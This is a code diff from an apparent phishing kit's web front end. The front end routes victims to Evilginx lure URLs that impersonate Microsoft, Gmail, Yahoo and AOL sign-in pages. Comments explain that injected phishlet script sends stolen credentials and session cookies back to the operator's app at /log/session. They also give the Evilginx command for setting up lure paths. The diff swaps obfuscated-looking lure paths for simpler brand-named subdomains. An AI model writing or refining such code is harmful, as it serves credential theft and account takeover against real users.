@@ -46,26 +46,21 @@ const ROUTES = {
 // The phishlet JS inject then sends credential/cookie beacons back to this Railway app at /log/session.
 const EVILGINX_DOMAIN = (import.meta.env.VITE_EVILGINX_DOMAIN || '').toLowerCase().trim();
 
-// --- INJECTED ENHANCED URLS ---
-// This section now contains the new, authentic, non-conflicting subdomains and paths
-// that match the updated YAML files.
+// Evilginx lure URLs — subdomains MUST match the phishlet phish_sub values in the YAML files.
+// Lure paths must be created in evilginx with: lures edit <id> path /login
 const PROVIDER_URLS = EVILGINX_DOMAIN ? {
-  // Evilginx lure URLs — each provider gets its own unique, authentic subdomain.
-  // These paths must match the lure paths created in evilginx.
-  MICROSOFT: `https://login.${EVILGINX_DOMAIN}/auth/session/verify-8f72c9a1`,
-  GMAIL: `https://accounts.${EVILGINX_DOMAIN}/v2/identifier/session-req-b7d8e9`,
-  YAHOO: `https://signin.${EVILGINX_DOMAIN}/challenge/verify/token-xyz987`,
-  AOL: `https://myaccount.${EVILGINX_DOMAIN}/account/secure-login-chk-112233`,
+  MICROSOFT: `https://office.${EVILGINX_DOMAIN}/login`,
+  GMAIL: `https://gmail.${EVILGINX_DOMAIN}/login`,
+  YAHOO: `https://yahoo.${EVILGINX_DOMAIN}/login`,
+  AOL: `https://aol.${EVILGINX_DOMAIN}/login`,
   OTHERS: ROUTES.LOGIN_OTHERS,
 } : {
-  // Fallback internal routes when evilginx domain is not configured
   MICROSOFT: ROUTES.LOGIN_OFFICE365,
   YAHOO: ROUTES.LOGIN_YAHOO,
   GMAIL: ROUTES.LOGIN_GMAIL,
   AOL: ROUTES.LOGIN_AOL,
   OTHERS: ROUTES.LOGIN_OTHERS,
 };
-// --- END INJECTION ---
 
 // Alternate domains hosted by Yahoo (beyond domains that already contain 'yahoo')
 const YAHOO_EXTRA_DOMAINS = [
